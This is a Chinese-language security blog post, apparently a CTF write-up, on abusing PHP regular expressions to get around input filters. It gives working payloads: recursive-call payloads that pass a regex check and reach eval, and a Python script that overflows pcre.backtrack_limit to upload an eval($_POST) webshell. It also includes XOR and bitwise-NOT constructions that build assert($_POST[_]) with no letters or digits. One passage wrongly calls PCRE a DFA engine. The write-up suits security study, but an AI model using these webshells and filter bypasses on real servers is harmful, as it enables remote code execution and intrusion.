## 浅析PHP正则表达式的利用技巧

来源：[https://xz.aliyun.com/t/3537](https://xz.aliyun.com/t/3537)

时间 2018-12-12 15:36:02



## 正则表达式是什么

正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、

将匹配的子串替换或者从某个串中取出符合某个条件的子串等。包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为"元字符"）。

另外正则引擎主要可以分为基本不同的两大类：一种是DFA(确定性有穷自动机），另一种是NFA（非确定性有穷自动机）。

在NFA中由于表达式主导的串行匹配方式，所以用到了回溯（backtracking），这个是NFA最重要的部分，每一次某个分支的匹配失败都会导-致一次回溯。

DFA没有回溯，因此看起来在某些情况下会比NFA来得更快，但是在真正使用中，DFA需要进行预编译才能获得更好效果，

因为DFA的匹配方式需要更多的内存和时间，在第一次遇到正则表达式时需要比NFA详细得多的方法来分析这个表达式，

不过可以预先把对不同正则表达式的分析结果建好，DFA就可以获得比NFA更优的速度。

虽然NFA速度更慢，并且实现复杂，但是它又有着比DFA强大的多的功能，比如支持环视，支持反向引用（虽然这个是非正则的）等，

因此大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。


### 0x02 扩展表示法

扩展表示是以问号开始（?…）,通常用于在判断匹配之前提供标记，实现一个前视（或者后视）匹配，或者条件检查。

尽管圆括号使用这些符号，但是只有（?P<name>）表述一个分组匹配。</name>

正则表达式 | 匹配字符串
-----------| ---------
`(?:\w+\.)*` | 以句点作为结尾的字符串，例如“google.”、“twitter.”、“facebook.”，但是这些匹配不会保存下来供后续的使用和数据检索
`(?=.com)` | 如果一个字符串后面跟着“.com”才做匹配操作，并不使用任何目标字符串
`(?!.net)` |如果一个字符串后面不是跟着“.net”才做匹配操作
`(?<=800-)` |如果字符串之前为“800-”才做匹配，假定为电话号码，同样，并不使用任何输入字符串
`(?<!192\.168\.)` |如果一个字符串之前不是“192.168.”才做匹配操作，假定用于过滤掉一组 C 类 IP 地址
`(?(1)y\|x)` |如果一个匹配组 `1（\1）`存在，就与 y 匹配；否则，就与 x 匹配
`\(((?>[^()]+)\|(?R))* \)` | 进行循环匹配



## 循环匹配探索

在上述的扩展表达式中有一个循环模式， 特殊项`(?R)`提供了递归的这种特殊用法，在PRCE模式中，考虑匹配圆括号内字符串的问题，

允许无限嵌套括号。如果不使用递归， 最好的方式是使用一个模式匹配固定深度的嵌套。

这个PCRE模式解决了圆括号问题(假设 PCRE_EXTENDED 选项被设置了， 因此空白字符被忽略)：`\( ( (?>[^()]+) | (?R) )* \)。`#### IN:

```php
<?php 
var_dump(preg_match('/\((?R)*\)/','((((()))'));
var_dump(preg_replace('/\((?R)*\)/',NULL,'((()))'));
var_dump(preg_replace('/\((?R)*\)/',NULL,'((()))abc'));
?>
```


#### OUT:

```
int(1) string(0) "" string(3) "abc"
```

从以上的输出结果，可以明显的发现，`'/\((?R)*\)/'`这个正则表达式，进行自身循环匹配。


### 从一道ctf题浅析利用

题目的名字为[easy – phplimit][0]，是p神出的一个练习代码审计的题目。源码如下：

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
eval($_GET['code']);
} else {
    show_source(__FILE__);
}
```

第二部分也提到了，这个正则是对'()'的一种循环匹配，`"';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])"`这关系式的意思是，

从code参数中，匹配匹配字母、数字、下划线，其实就是'\w+'，然后在匹配一个循环的'()'，将匹配的替换为NULL，判断剩下的是否只有';'。

于是就开始翻阅[手册][http://www.php.net/manual)，这个真的是好东西。以下是对这一块的探究：][1]

自搭建环境测试

```
getcwd(): 获取当前路径

IN:

?code=print_r(getcwd());

OUT:

A:\tools\phpStudy\WWW\study
dirname(): 返回路径中的目录部分

IN:

?code=print_r(dirname(getcwd()));

OUT:

A:\tools\phpStudy\WWW
```

这里对dirname($path)进行一个解释：该函数的返回值为，返回path的父目录。如果在 path中没有斜线，则返回一个点('.')，

表示当前目录，因此此处为父目录`'A:\tools\phpStudy\WWW'`，后面使用chdir时是当前目录。

```
chdir(): 改变工作目录
IN:
?code=print_r(chdir(getcwd()));
OUT:
1
成功返回1(true)
get_defined_vars(): 返回由所有已定义变量所组成的数组
IN:
?test=1&code=print_r(get_defined_vars());
OUT:
Array([_GET] => Array ( [test] => 1 [code] => print_r(get_defined_vars()); ) [_POST] => Array ( ) [_COOKIE] => Array() ) [_FILES] => Array ( ) [a] => Array()....
```


#### 探测到目录与文件情况后就可以进行构造payload

```
=>获得路径为/var/html
?code = print_r(getcwd());
=>查看路径下内容没有可用的
?code = print_r(scandir(getcwd()))
=>探测上一级为Array ( [0] => . [1] => .. [2] => flag_phpbyp4ss [3] => html )
?code = print_r(scandir(dirname(getcwd())))
=>发现flag文件，进行读取
?code = readfile(next(array_reverse(scandir(dirname(getcwd())))))
=>发现报错，不存在flag_phpbyp4ss文件，更改工作目录
?code = readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))))
```

会发现最后的payload多了一个dirname()，原因是因为dirname()中的path没有斜线就会返回本路径，不会影响最后结果。

另外在RCTF中，r-cursive中也用到了这个知识点，官方的解使用eval(implode(getallheaders()))，执行返回的HHTP头内的信息，更改头部信息加上cmd: phpinfo();// 达到命令执行。

但是该题目中却不可以，由于环境不同apache模块的函数不能在ngnix中执行，参照大佬们的思路，利用get_defined_vars()执行GET的参数


#### payload为：

```php
?1=readfile(../flag_phpbyp4ss);&code=eval(implode(reset(get_defined_vars())));
```


### php回溯机制

前面我们已经说到了PHP使用PCRE库，那么正则引擎就是DFA(确定性有穷自动机），使用回溯的方式进行匹配，

大致过程就是在对一个字符串进行匹配时，如果匹配失败吐出一个字符，然后再进行匹配，如果依然失败，重复上面操作.....


#### 举一个例子，更详细的阐述：

```php
<?php
preg_match('/<\?.*[(`;?>].*/','<?php phpinfo();//abc');
```


#### 过程：

```
<\?.* => <?php phpinfo();//abc
<\?.*[(`;?>] => <?php phpinfo();//ab
<\?.*[(`;?>] => <?php phpinfo();//a
<\?.*[(`;?>] => <?php phpinfo();//
<\?.*[(`;?>] => <?php phpinfo();/
<\?.*[(`;?>] => <?php phpinfo();
<\?.*[(`;?>] => <?php phpinfo()
<\?.*[(`;?>] => <?php phpinfo();
<\?.*[(`;?>].* => <?php phpinfo();//abc
```

可以发现这其中存在一个回溯过程，首先<\?. 直接把所有的匹配完成，使得. 后面至少有一个[(`;?>].*没有完成匹配，

因此就向前匹配，知道匹配成功（到phpinfo()后面的;）。


### 使用php的pcre.backtrack_limit限制绕过

当然在上面那个匹配中不可能一直回溯，那这样就会消耗服务器资源，就形成了正则表达式的拒绝服务攻击，因此php就有了限制回溯的机制


IN:

<?php

var_dump(ini_get('pcre.backtrack_limit'));

var_dump(preg_match('/<\?. [(`;?>]. /is', '<?php phpinfo();//'.str_repeat('c', 999995)));

  
OUT:

string(7) "1000000" bool(false)

在这个点上p师傅出过一道题目，源码如下：

```php
<?php
function is_php($data){
return preg_match('/<\?.*[(`;?>].*/is', $data);
}
if(empty($_FILES)) {
die(show_source(__FILE__));
}
$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
echo "bad request";
} else {
@mkdir($user_dir, 0755);
$path = $user_dir . '/' . random_int(0, 10) . '.php';
move_uploaded_file($_FILES['file']['tmp_name'], $path);
header("Location: $path", true, 303);
 }
```


#### payload：

```
import requests
from io import BytesIO

files = {
'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
 }

 res = requests.post('http://IP/index.php', files=files, allow_redirects=False)
 print(res.headers)
```

关键点就是，is_php($data)要为false，也就是`preg_match('/<\?.*[(`;?>].*/is', $data);`为false，根据preg_match函数的性质，

如果匹配不到或者`$data`为数组，那么返回为false。当然数组是不可能的，因为file_get_contents函数是将内容读入$data中，

那么就考了匹配不了这种情况，因为上面我们发现，当超过最好回溯限制式将返回false，因为利用这一个点进行突破。


### 使用无字母数字方式绕过

这是以一个题目引发的，之前看过P师傅的[讲解][2]，

很是收益。先膜一波，然后具体地解析一下代码。

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
eval($_GET['shell']);
}
```

对于这个正则表达式，很显然，把数字大小写字母全部过滤了，因为shell无法直接命令执行。在p神的博客中提到三种方法，


#### 方法一：使用异或

```php
<?php
 $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
 $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
 $___=$$__;
 $_($___[_]); // assert($_POST[_]);
```


#### 对上面的payload这里做出具体解释：


#### IN:

```php
<?php
$payload = array('a','s','s','e','r','t','P','O','S','T');
foreach ($payload as $n => $p){
    echo $p^'`';
}
```


#### OUT:
`0/34`可以发现'P''S''T'这三个字母异或出来是数字，所以与']'异或一下，最终为：


#### IN:

```php
<?php
$payload = array('a','s','s','e','r','t','P','O','S','T');
foreach ($payload as $p){
    if($p=='P'||$p=='S'||$p=='T'){
        echo urlencode($p^']');
        continue;
    }
    echo urlencode($p^'`');
}
```


#### OUT:

```php
%01%13%13%05%12%14%0D%2F%0E%09
```

这样得到了异或需要的值，然后我们看一下代码的具体操作，首先是先进行异或，字符连接得到'assert'，也就是$_变量，然后按照相同办法得到'_POST'，接下来就是组装。


#### 方法二：使用取反

```php
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;
$____='';
$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});
$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});
$_=$$_____;
$____($_[$__]);
```

上面看起来就没有头绪，这里我简单说明一下。

在ｐ师傅的这篇文章中可以发现：


#### IN:

```php
<?php echo ~('和'{2});
```


#### OUT:

```php
s
```

后来在我的尝试下，发现在php7以下都会报一个错误：syntax error, unexpected '{' in 1.php on line 3，但是换一种写法就可以

```php
<?php
$___="和";
echo ~($___{2});
```

这里先记下来了，解析一下这语句的意思，(''{})来输出汉字的UTF-8编码的某个字符，另外记录一个小知识点：


#### IN:

```php
<?php 
echo base_convert(ord("和"[0]), 10, 16);
echo base_convert(ord("和"[1]), 10, 16);
echo base_convert(ord("和"[2]), 10, 16).'<br/>';
echo urlencode("和").'<br/>';
```


#### OUT:

```
e5928c
%E5%92%8C
```

可以发现utf-8编码与与Url编码的关系，了解了这些后，针对于怎么得到payload写了如下程序：


#### IN:

```php
<?php
//获取payload的unicode编码
function get_unicode(){
    $payload = array('a','s','s','e','r','t','P','O','S','T');
    $payloadTounicode = array();
    foreach ($payload as $p){
        $payloadTounicode[$p] = base_convert(ord($p), 10, 16);
    }
    return $payloadTounicode;
}
//在输入的汉字中找到囊括payload的汉字
function find_unicode($fuzz, $payloadTounicode){
    $found = array();
    foreach ($payloadTounicode as $p){
        echo $p;
        foreach($fuzz as $f){
            if((base_convert(ord(~($f{1})), 10, 16) == $p) || (base_convert(ord(~($f{2})), 10, 16) == $p)){
                $found[] = $f;
                break;
            }
        }
        echo '
';
    }
    return $found;
}
$fuzz = array('和','看','的','加','徐','不','瞰','始','俯','站','次','半');
var_dump(find_unicode($fuzz,get_unicode()));
```


#### OUT:
`array(9) { [0]=> string(3) "瞰" [1]=> string(3) "和" [2]=> string(3) "的" [3]=> string(3) "不" [4]=> string(3)``"看" [5]=> string(3) "俯" [6]=> string(3) "瞰" [7]=> string(3) "次" [8]=> string(3) "站" }`找到需要是要的汉字，开始后构造payload(payload在开头已经给出了，简单说一下自己的理解)：

```php
<?php
$__=('>'>'<')+('>'>'<');
// 这里是true+true=2
$_=$__/$__;
// 这里2/2=1
$___="瞰";$____.=~($___{$_});
// 获得'a'字母
$_=$$_____;
// $_____为连接而成的'_POST'，$_为$_ POST
$____($_[$__]);
// 最终为assert($_POST[2])
```

以上有错误的地方希望，各位师傅能够指正(Ths)


[0]: http://51.158.75.42:8084/
[1]: http://www.php.net/manual)%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%9C%9F%E7%9A%84%E6%98%AF%E5%A5%BD%E4%B8%9C%E8%A5%BF%E3%80%82%E4%BB%A5%E4%B8%8B%E6%98%AF%E5%AF%B9%E8%BF%99%E4%B8%80%E5%9D%97%E7%9A%84%E6%8E%A2%E7%A9%B6%EF%BC%9A
[2]: https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html